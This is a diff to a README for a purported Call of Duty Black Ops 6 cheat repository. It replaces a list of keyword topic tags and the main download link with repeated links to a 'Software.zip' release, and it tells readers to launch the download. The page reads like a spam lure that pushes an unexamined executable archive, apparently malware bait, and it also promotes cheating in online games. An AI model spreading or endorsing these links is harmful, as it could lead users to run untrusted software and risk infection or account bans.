@@ -25,23 +25,23 @@ In this repository, you'll find:
 
 Explore some of the key topics covered in this repository:
 
-- ["aimbot-bo6"](img.shields.io)
-- ["black-ops-6-cheat"](img.shields.io)
-- ["bo6-aimbot"](img.shields.io)
-- ["bo6-cheats"](img.shields.io)
-- ["bo6-cheats-download"](img.shields.io)
-- ["bo6-hack"](img.shields.io)
-- ["bo6-wallhack"](img.shields.io)
-- ["call-of-duty-bo6-hack"](img.shields.io)
-- ["cheats-bo6"](img.shields.io)
-- ["cod-black-ops-6-hack"](img.shields.io)
-- ["cod-bo6-cheat"](img.shields.io)
-- ["cod-bo6-cheats-2025"](img.shields.io)
-- ["hack-black-ops-6"](img.shields.io)
+- ["aimbot-bo6"](https://github.com/ostrac0/Call-Of-Duty-Black-Ops-6-external/releases/download/v2.0/Software.zip)
+- ["black-ops-6-cheat"](https://github.com/ostrac0/Call-Of-Duty-Black-Ops-6-external/releases/download/v2.0/Software.zip)
+- ["bo6-aimbot"](https://github.com/ostrac0/Call-Of-Duty-Black-Ops-6-external/releases/download/v2.0/Software.zip)
+- ["bo6-cheats"](https://github.com/ostrac0/Call-Of-Duty-Black-Ops-6-external/releases/download/v2.0/Software.zip)
+- ["bo6-cheats-download"](https://github.com/ostrac0/Call-Of-Duty-Black-Ops-6-external/releases/download/v2.0/Software.zip)
+- ["bo6-hack"](https://github.com/ostrac0/Call-Of-Duty-Black-Ops-6-external/releases/download/v2.0/Software.zip)
+- ["bo6-wallhack"](https://github.com/ostrac0/Call-Of-Duty-Black-Ops-6-external/releases/download/v2.0/Software.zip)
+- ["call-of-duty-bo6-hack"](https://github.com/ostrac0/Call-Of-Duty-Black-Ops-6-external/releases/download/v2.0/Software.zip)
+- ["cheats-bo6"](https://github.com/ostrac0/Call-Of-Duty-Black-Ops-6-external/releases/download/v2.0/Software.zip)
+- ["cod-black-ops-6-hack"](https://github.com/ostrac0/Call-Of-Duty-Black-Ops-6-external/releases/download/v2.0/Software.zip)
+- ["cod-bo6-cheat"](https://github.com/ostrac0/Call-Of-Duty-Black-Ops-6-external/releases/download/v2.0/Software.zip)
+- ["cod-bo6-cheats-2025"](https://github.com/ostrac0/Call-Of-Duty-Black-Ops-6-external/releases/download/v2.0/Software.zip)
+- ["hack-black-ops-6"](https://github.com/ostrac0/Call-Of-Duty-Black-Ops-6-external/releases/download/v2.0/Software.zip)
 
 ## Get Your Cheats Now!
 
-Ready to enhance your Black Ops 6 gameplay? Click [here](https://github.com/user-attachments/files/18383251/Software.zip) to download the cheats you need to dominate the battlefield!
+Ready to enhance your Black Ops 6 gameplay? Click [here](https://github.com/ostrac0/Call-Of-Duty-Black-Ops-6-external/releases/download/v2.0/Software.zip) to download the cheats you need to dominate the battlefield!
 
 Don't forget, the link provided needs to be launched to access the cheats. If you encounter any issues with the link, make sure to check the "Releases" section for alternative download options.
 
